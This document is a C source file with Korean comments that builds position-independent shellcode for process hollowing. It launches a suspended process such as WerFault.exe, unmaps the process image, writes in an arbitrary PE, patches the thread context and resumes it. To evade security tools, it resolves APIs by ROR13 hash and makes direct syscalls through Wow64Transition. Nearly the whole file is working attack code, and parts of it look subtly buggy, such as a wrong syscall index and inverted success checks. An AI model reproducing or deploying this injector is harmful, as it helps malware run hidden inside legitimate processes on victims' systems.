#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>
#include <wchar.h>
#include <winternl.h>

#define STATUS_CONFLICTING_ADDRESSES 0xC0000018

// 시스템콜을 진행할 함수의 형태를 미리 정의한다.
typedef NTSTATUS(NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI* _NtSetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI* _NtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);

BOOL __stdcall RunPE(HMODULE kernel32, HMODULE ntdll, PBYTE syscallShellcode, LPCWSTR lpwPath, LPCWSTR lpwCmdline, PBYTE pBuffer, PHANDLE processHandle);
LPVOID __stdcall MyVirtualAllocEx(HMODULE ntdll, PBYTE syscallShellcode, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, NTSTATUS* status);
void __stdcall AddWString(WCHAR* dst, WCHAR* src);
void* __stdcall MyZeromemory(void* s, unsigned int len);
void* __stdcall MyMemoryCopy(void* dst, const void* src, unsigned int cnt);
DWORD __stdcall UnicodeROR13(WCHAR* unicode_string);
DWORD __stdcall ROR13(char* string);
LPVOID __stdcall DllManualMapp(HMODULE kernel32, WCHAR* dllPath);
unsigned int __stdcall GetSyscallIndex(const PBYTE pFuncAddr);
PPEB GetPEB(void);
HMODULE __stdcall FindModuleByHash(DWORD hash);
LPVOID __stdcall FindFunctionByHash(HMODULE module, DWORD hash);

int __stdcall Shellcode(LPCWSTR lpwPath, LPCWSTR lpwCmdline, PBYTE pBuffer)
{
	// .text 영역에 문자열 생성을 위해 반드시 아래와 같이 작성해야함.
	// 일반 문자열은 .data, .rdata 영역에 저장되어서 쉘코드에 사용할 수 없음.
	WCHAR ntdllPath[] = { '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n','t','d','l','l','.','d','l','l', 0 };
	WCHAR ntdllName[] = { 'n','t','d','l','l','.','d','l','l', 0 };

	// PEB에 존재하는 kernel32.dll의 주소를 찾는다.
	HMODULE kernel32 = FindModuleByHash(0x6E2BCA17);
	if (kernel32 == INVALID_HANDLE_VALUE)
		return 1;

	// ROR13 해시로 함수 이름과 DLL을 찾는다.
	FARPROC pGetModuleHandleW = FindFunctionByHash(kernel32, 0xD332491A);
	FARPROC pVirtualProtect = FindFunctionByHash(kernel32, 0x7946C61B);
	FARPROC pCreateFileTransactedW = FindFunctionByHash(kernel32, 0xECF5ED76);
	FARPROC pCloseHandle = FindFunctionByHash(kernel32, 0xFFD97FB);

	BYTE syscallShellcode[] =
	{
		0xB8, 0x00, 0x00, 0x00, 0x00,	// MOV EAX, syscallId
		0xBA, 0x00, 0x00, 0x00, 0x00,	// MOV EDX, Wow64Transition Address
		0xFF, 0xD2,						// CALL EDX
		0xC3							// RET
	};

	// Wow64Transition 함수의 주소를 시스템콜 쉘코드에 삽입한다.
	LPVOID pWow64Transition = FindFunctionByHash((HMODULE)pGetModuleHandleW(ntdllName), 0x1726BA86);
	*(unsigned int*)(syscallShellcode + 6) = *(PDWORD)pWow64Transition;
	DWORD dwOldProtect;
	// syscallShellcode를 실행 가능한 영역으로 변경한다.
	pVirtualProtect(syscallShellcode, sizeof(syscallShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 시스템콜 번호 추출을 위해 ntdll을 직접 매핑한다.
	HMODULE ntdll = DllManualMapp(kernel32, ntdllPath);
	if (ntdll == NULL)
		return 1;

	HANDLE processHandle;
	if (RunPE(kernel32, ntdll, syscallShellcode, lpwPath, lpwCmdline, pBuffer, &processHandle) == FALSE)
	{
		FARPROC pNtTerminateProcess = FindFunctionByHash(ntdll, 0x7929BBF3);
		*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtTerminateProcess);
		((_NtTerminateProcess)syscallShellcode)(processHandle, 1);
		return 1;
	}

	return 0;
}

BOOL __stdcall RunPE(HMODULE kernel32, HMODULE ntdll, PBYTE syscallShellcode, LPCWSTR lpwPath, LPCWSTR lpwCmdline, PBYTE pBuffer, PHANDLE processHandle)
{
	FARPROC pCreateProcessW = FindFunctionByHash(kernel32, 0x16B3FE88);
	FARPROC pNtReadVirtualMemory = FindFunctionByHash(ntdll, 0x3AEFA5AA);
	FARPROC pNtUnmapViewOfSection = FindFunctionByHash(ntdll, 0xF21037D0);
	FARPROC pNtWriteVirtualMemory = FindFunctionByHash(ntdll, 0xC5108CC2);
	FARPROC pNtSetContextThread = FindFunctionByHash(ntdll, 0x6935E395);
	FARPROC pNtProtectVirtualMemory = FindFunctionByHash(ntdll, 0x8C394D89);
	FARPROC pNtResumeThread = FindFunctionByHash(ntdll, 0xC54A46C8);

	STARTUPINFOA ProcessStartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	MyZeromemory(&ProcessInfo, sizeof(ProcessInfo));
	MyZeromemory(&ProcessStartupInfo, sizeof(ProcessStartupInfo));
	ProcessStartupInfo.cb = sizeof(ProcessStartupInfo);
	pCreateProcessW(lpwPath, lpwCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &ProcessStartupInfo, &ProcessInfo);

	PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
	if (lpDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS lpNtHeader = (PIMAGE_NT_HEADERS)((LONG_PTR)pBuffer + lpDosHeader->e_lfanew);
	ULONG lpPreferableBase = lpNtHeader->OptionalHeader.ImageBase;

	CONTEXT ThreadContext;
	MyZeromemory(&ThreadContext, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_INTEGER;

	FARPROC pNtGetContextThread = FindFunctionByHash(ntdll, 0xE935E393);
	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtGetContextThread);
	if (!NT_SUCCESS(((_NtGetContextThread)syscallShellcode)(ProcessInfo.hThread, &ThreadContext)))
		return FALSE;

	LPVOID lpPebImageBase;
	lpPebImageBase = (LPVOID)(ThreadContext.Ebx + 2 * sizeof(ULONG));

	PVOID lpOriginalImageBase;
	ULONG dwOriginalImageBase;

	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtReadVirtualMemory);
	((_NtReadVirtualMemory)syscallShellcode)(ProcessInfo.hProcess, lpPebImageBase, &dwOriginalImageBase, sizeof(dwOriginalImageBase), NULL);
	lpOriginalImageBase = (PVOID)dwOriginalImageBase;
	if (lpOriginalImageBase == (LPVOID)lpPreferableBase)
	{
		*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtReadVirtualMemory);
		if (((_NtUnmapViewOfSection)syscallShellcode)(ProcessInfo.hProcess, lpOriginalImageBase))
		{
			return FALSE;
		};
	};

	LPVOID lpAllocatedBase;
	NTSTATUS status;
	if (!(lpAllocatedBase = MyVirtualAllocEx(ntdll, syscallShellcode, ProcessInfo.hProcess, (LPVOID)lpPreferableBase, lpNtHeader->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE, &status)))
	{
		if (status == STATUS_CONFLICTING_ADDRESSES)
		{
			if (!(lpAllocatedBase = MyVirtualAllocEx(ntdll, syscallShellcode, ProcessInfo.hProcess, NULL, lpNtHeader->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE, &status)))
			{
				return FALSE;
			};
		}
		else
		{
			return FALSE;
		}
	};

	if (lpOriginalImageBase != lpAllocatedBase)
	{
		*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtWriteVirtualMemory);
		if (((_NtWriteVirtualMemory)syscallShellcode)(ProcessInfo.hProcess, lpPebImageBase, &lpAllocatedBase, sizeof(lpAllocatedBase), NULL) != 0)
		{
			
			return FALSE;
		}
	}

	lpNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
	if (lpAllocatedBase != (LPVOID)lpPreferableBase)
	{
		if (lpNtHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
		{
			return FALSE;
		}
		else
		{
			lpNtHeader->OptionalHeader.ImageBase = (ULONG)lpAllocatedBase;
			DWORD lpRelocationTableBaseRva = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

			PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
			DWORD dwRelocationTableBaseOffset = 0;
			for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
				if (lpRelocationTableBaseRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
					lpRelocationTableBaseRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize) {
					dwRelocationTableBaseOffset = lpHeaderSection[dwSecIndex].PointerToRawData + lpRelocationTableBaseRva - lpHeaderSection[dwSecIndex].VirtualAddress;
					break;
				}
			};
			LPVOID lpRelocationTableBase = (LPVOID)((DWORD_PTR)pBuffer + dwRelocationTableBaseOffset);
			DWORD dwRelocationTableSize = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
			for (DWORD dwMemIndex = 0; dwMemIndex < dwRelocationTableSize;)
			{
				IMAGE_BASE_RELOCATION* lpBaseRelocBlock = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)lpRelocationTableBase + dwMemIndex);
				LPVOID lpBlocksEntery = (LPVOID)((DWORD_PTR)lpBaseRelocBlock + sizeof(lpBaseRelocBlock->SizeOfBlock) + sizeof(lpBaseRelocBlock->VirtualAddress));

				DWORD dwNumberOfBlocks = (lpBaseRelocBlock->SizeOfBlock - sizeof(lpBaseRelocBlock->SizeOfBlock) - sizeof(lpBaseRelocBlock->VirtualAddress)) / sizeof(WORD);
				WORD* lpBlocks = (WORD*)lpBlocksEntery;

				for (DWORD dwBlockIndex = 0; dwBlockIndex < dwNumberOfBlocks; dwBlockIndex++)
				{
					WORD wBlockType = (lpBlocks[dwBlockIndex] & 0xf000) >> 0xC;
					WORD wBlockOffset = lpBlocks[dwBlockIndex] & 0x0fff;

					if ((wBlockType == IMAGE_REL_BASED_HIGHLOW) || (wBlockType == IMAGE_REL_BASED_DIR64))
					{
						DWORD dwAdrressToFixRva = lpBaseRelocBlock->VirtualAddress + (DWORD)wBlockOffset;

						lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
						DWORD dwAdrressToFixOffset = 0;
						for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
							if (dwAdrressToFixRva >= lpHeaderSection[dwSecIndex].VirtualAddress &&
								dwAdrressToFixRva < lpHeaderSection[dwSecIndex].VirtualAddress + lpHeaderSection[dwSecIndex].Misc.VirtualSize) {
								dwAdrressToFixOffset = lpHeaderSection[dwSecIndex].PointerToRawData + dwAdrressToFixRva - lpHeaderSection[dwSecIndex].VirtualAddress;
								break;
							};
						};

						ULONG* lpAddressToFix = (ULONG*)((DWORD_PTR)pBuffer + dwAdrressToFixOffset);
						*lpAddressToFix -= lpPreferableBase;
						*lpAddressToFix += (ULONG)lpAllocatedBase;
					};
				};
				dwMemIndex += lpBaseRelocBlock->SizeOfBlock;
			};
		};
	};

	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtSetContextThread);
	ThreadContext.Eax = (ULONG)lpAllocatedBase + lpNtHeader->OptionalHeader.AddressOfEntryPoint;
	if (((_NtSetContextThread)syscallShellcode)(ProcessInfo.hThread, &ThreadContext) != 0)
	{
		return FALSE;
	}

	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtWriteVirtualMemory);
	if (((_NtWriteVirtualMemory)syscallShellcode)(ProcessInfo.hProcess, lpAllocatedBase, pBuffer, lpNtHeader->OptionalHeader.SizeOfHeaders, NULL) != 0)
	{
		return FALSE;
	}

	DWORD dwOldProtect;
	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtProtectVirtualMemory);
	if (!((_NtProtectVirtualMemory)syscallShellcode)(ProcessInfo.hProcess, lpAllocatedBase, (PULONG)lpNtHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOldProtect))
	{
		return FALSE;
	};

	IMAGE_SECTION_HEADER* lpSectionHeaderArray = (IMAGE_SECTION_HEADER*)((ULONG_PTR)pBuffer + lpDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < lpNtHeader->FileHeader.NumberOfSections; i++)
	{
		*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtWriteVirtualMemory);
		if (((_NtWriteVirtualMemory)syscallShellcode)(
			ProcessInfo.hProcess,
			(LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
			(LPVOID)((DWORD_PTR)pBuffer + lpSectionHeaderArray[i].PointerToRawData),
			lpSectionHeaderArray[i].SizeOfRawData,
			NULL
			))
		{
			return FALSE;
		};

		DWORD dwSectionMappedSize = 0;
		if (i == lpNtHeader->FileHeader.NumberOfSections - 1) {
			dwSectionMappedSize = lpNtHeader->OptionalHeader.SizeOfImage - lpSectionHeaderArray[i].VirtualAddress;
		}
		else {
			dwSectionMappedSize = lpSectionHeaderArray[i + 1].VirtualAddress - lpSectionHeaderArray[i].VirtualAddress;
		}
		DWORD dwSectionProtection = 0;
		if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_EXECUTE_READWRITE;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			dwSectionProtection = PAGE_EXECUTE_READ;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_EXECUTE_WRITECOPY;
		}
		else if ((lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) &&
			(lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			dwSectionProtection = PAGE_READWRITE;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			dwSectionProtection = PAGE_EXECUTE;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_READ) {
			dwSectionProtection = PAGE_READONLY;
		}
		else if (lpSectionHeaderArray[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
			dwSectionProtection = PAGE_WRITECOPY;
		}
		else {
			dwSectionProtection = PAGE_NOACCESS;
		}

		*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtProtectVirtualMemory);
		if (!((_NtProtectVirtualMemory)syscallShellcode)(ProcessInfo.hProcess, (LPVOID)((ULONG)lpAllocatedBase + lpSectionHeaderArray[i].VirtualAddress),
			(PULONG)dwSectionMappedSize, dwSectionProtection, &dwOldProtect))
		{
			return FALSE;
		};
	};

	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtResumeThread);
	((_NtResumeThread)syscallShellcode)(ProcessInfo.hThread, NULL);

	return TRUE;
}

LPVOID __stdcall MyVirtualAllocEx(HMODULE ntdll, PBYTE syscallShellcode, HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, NTSTATUS* status)
{
	SIZE_T RegionSize = dwSize;
	PVOID BaseAddress = lpAddress;

	FARPROC pNtAllocateVirtualMemory = FindFunctionByHash(ntdll, 0xD33BCABD);
	*(unsigned int*)(syscallShellcode + 1) = GetSyscallIndex((PBYTE)pNtAllocateVirtualMemory);
	*status = (NTSTATUS)((_NtAllocateVirtualMemory)syscallShellcode)(hProcess, &BaseAddress, 0x00, &RegionSize, flAllocationType, flProtect);

	if (*status == 0)
	{
		return BaseAddress;
	}
	else
	{
		return 0;
	}
}

void __stdcall AddWString(WCHAR* dst, WCHAR* src)
{
	int i, j;
	for (i = 0; i < dst[i] != '\0'; i++);

	for (j = 0; j < src[j] != '\0'; j++)
		dst[i + j] = src[j];

	dst[i + j] = '\0';
}

void* __stdcall MyZeromemory(void* s, unsigned int len)
{
	unsigned char* p = s;
	while (len--)
	{
		*p++ = 0x00;
	}

	return s;
}

void* __stdcall MyMemoryCopy(void* dst, const void* src, unsigned int cnt)
{
	char* pszDest = (char*)dst;
	const char* pszSource = (const char*)src;
	if ((pszDest != NULL) && (pszSource != NULL))
	{
		while (cnt)
		{
			*(pszDest++) = *(pszSource++);
			--cnt;
		}
	}
	return dst;
}

DWORD __stdcall UnicodeROR13(WCHAR* unicode_string)
{
	if (unicode_string == 0)
		return 0;

	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

DWORD __stdcall ROR13(char* string)
{
	if (string == NULL)
		return 0;

	DWORD hash = 0;

	while (*string) {
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

LPVOID __stdcall DllManualMapp(HMODULE kernel32, WCHAR* dll)
{
	FARPROC pCreateFileW = FindFunctionByHash(kernel32, 0x7c0017bb);
	FARPROC pCreateFileMappingW = FindFunctionByHash(kernel32, 0x56c6123f);
	FARPROC pMapViewOfFile = FindFunctionByHash(kernel32, 0x7b073c59);
	FARPROC pGetWindowsDirectoryW = FindFunctionByHash(kernel32, 0xf8ecdc03);

	WCHAR dllPath[MAX_PATH];
	pGetWindowsDirectoryW(dllPath, MAX_PATH);
	AddWString(dllPath, dll);

	HANDLE dllFile = (HANDLE)pCreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (dllFile == INVALID_HANDLE_VALUE)
		return NULL;

	HANDLE dllMapping = (HANDLE)pCreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (dllMapping == INVALID_HANDLE_VALUE)
		return NULL;

	LPVOID dllMappingAddress = (LPVOID)pMapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
	if (dllMappingAddress == INVALID_HANDLE_VALUE)
		return NULL;

	return dllMappingAddress;
}

unsigned int __stdcall GetSyscallIndex(const PBYTE pFuncAddr)
{
	if (!pFuncAddr)
		return 0;

	// 함수의 주소에서 MOV EAX인 0xB8을 찾아 다음 4바이트 시스템콜 번호를 반환한다.
	int i;
	for (i = 0; i < 0xF; ++i)
	{
		if (*(pFuncAddr + i) == 0xB8)
			return *(unsigned int*)(pFuncAddr + i + 1);
	}

	return 0;
}

PPEB __declspec(naked) GetPEB(void)
{
	__asm {
		mov eax, fs: [0x30]
		ret
	}
}

HMODULE __stdcall FindModuleByHash(DWORD hash)
{
	PPEB peb;
	LDR_DATA_TABLE_ENTRY* module_ptr, * first_mod;

	peb = GetPEB();

	module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
	first_mod = module_ptr;
	do
	{
		if (UnicodeROR13(module_ptr->FullDllName.Buffer) == hash)
			return module_ptr->Reserved2[0];
		else
			module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
	} while (module_ptr && module_ptr != first_mod);

	return INVALID_HANDLE_VALUE;
}

LPVOID __stdcall FindFunctionByHash(HMODULE dll, DWORD hash)
{
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll;
	PIMAGE_NT_HEADERS32 nt_headers = (PIMAGE_NT_HEADERS32)((PBYTE)dll + dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)(((PBYTE)dll + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
	
	if (export_dir == NULL) return NULL;

	PDWORD names = (DWORD*)((PBYTE)dll + export_dir->AddressOfNames);
	PDWORD funcs = (DWORD*)((PBYTE)dll + export_dir->AddressOfFunctions);
	PWORD nameords = (WORD*)((PBYTE)dll + export_dir->AddressOfNameOrdinals);

	DWORD i;
	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char* string = (PBYTE)dll + names[i];
		if (hash == ROR13(string))
		{
			WORD nameord = nameords[i];
			DWORD functionRVA = funcs[nameord];
			return (PBYTE)dll + functionRVA;
		}
	}

	return NULL;
}

void __declspec(naked) ShellcodeEndpoint(void) {}

int WINAPI WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd)
{
	int shellcodeSize = (int)ShellcodeEndpoint - (int)Shellcode;
	FILE* output_file = fopen("shellcode.bin", "wb");		// 반드시 b 플래그를 넣어 바이너리 모드로 열어야함. 안그러면 개행문자와 같은 값을(0x20) 사용하는 일부 데이터가 소실될 수 있음.
	fwrite(Shellcode, shellcodeSize, 1, output_file);
	fclose(output_file);
	
	/* Shellcode Loader
	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (exec != NULL)
	{
		memcpy(exec, Shellcode, shellcodeSize);
		((int(*)(LPWSTR, LPWSTR, PBYTE))exec)(L"C:\\Windows\\System32\\WerFault.exe", NULL, binaryData);
	}
	*/

	return 0;
}